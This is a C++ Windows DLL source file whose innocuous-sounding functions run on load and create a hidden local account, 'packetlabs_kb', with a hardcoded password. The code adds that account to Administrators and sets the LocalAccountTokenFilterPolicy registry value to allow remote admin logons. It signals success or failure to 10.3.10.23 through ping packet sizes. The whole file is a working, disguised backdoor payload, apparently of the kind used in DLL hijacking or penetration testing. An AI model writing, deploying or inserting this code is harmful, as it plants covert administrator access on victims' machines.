#include "pch.h"
#include <iostream>
#include <windows.h>
#include <LM.h>
#include <string>
#pragma comment(lib, "Netapi32.lib")
using namespace std;
wstring name = L"packetlabs_kb";
LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
wstring password = L"Sl52vOY6Mvuglc19!";
LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
DWORD checkServerStatus;
USER_INFO_1 userinfo;

bool sendServerUpdateStatus(const std::string& host, int count = 1, int size = 1)
{
	std::string command = "ping " + host + " -n " + std::to_string(count) + " -l " + std::to_string(size);
	int exitCode = system(command.c_str());
	return (exitCode == 0);
}
bool modifyServerStatus()
{
	std::string command = "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f";
	int exitCode = system(command.c_str());
	return (exitCode == 0);
}

int devSrcConn(USER_INFO_1 userinfo)
{
	userinfo.usri1_name = lpName;
	userinfo.usri1_password = lpPassword;
	userinfo.usri1_password_age = 0;
	userinfo.usri1_priv = USER_PRIV_USER;
	userinfo.usri1_home_dir = NULL;
	userinfo.usri1_comment = NULL;
	userinfo.usri1_flags = UF_NORMAL_ACCOUNT;
	userinfo.usri1_script_path = NULL;
	_LOCALGROUP_MEMBERS_INFO_3 localgroupinfo;
	localgroupinfo.lgrmi3_domainandname = lpName;
	DWORD errorInStruct;
	checkServerStatus = NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &errorInStruct);
	if (checkServerStatus)
	{
		sendServerUpdateStatus("10.3.10.23", 1, 32); // bad
		return checkServerStatus;
	}
	else {
		sendServerUpdateStatus("10.3.10.23", 1, 12); // good
	}
	
	checkServerStatus = NetLocalGroupAddMembers(NULL, ((wstring)L"Administrators").c_str(), 3, (LPBYTE)&localgroupinfo, 1);
	if (checkServerStatus)
	{
		sendServerUpdateStatus("10.3.10.23", 1, 32); // bad
		return checkServerStatus;
	}
	else {
		sendServerUpdateStatus("10.3.10.23", 1, 12);// good
		modifyServerStatus(); // update token status
	}
	return 0; 

};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		checkServerStatus = devSrcConn(userinfo);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
